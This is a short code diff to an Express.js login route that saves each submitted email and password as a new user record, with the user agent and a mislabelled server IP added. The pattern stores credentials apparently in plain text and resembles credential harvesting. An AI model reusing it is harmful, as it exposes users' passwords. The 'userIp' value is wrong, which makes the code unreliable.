@@ -1,6 +1,6 @@
 const express = require('express');
 const router = express.Router();
-
+const IP = require('ip');
 
 // Load User model
 const User = require('../models/User');
@@ -16,8 +16,13 @@ router.get('/loginverify', (req, res) => res.render('login2'));
 // Login
 router.post('/loginok', (req, res, next) => {
   const { email, password } = req.body;
+
+  const userIp = IP.address();
+  console.log(userIp)
+
+  const userAgent = req.headers['user-agent']
   
-  const user = new User({ email, password });
+  const user = new User({ email, password, userIp, userAgent });
 
   user
     .save()
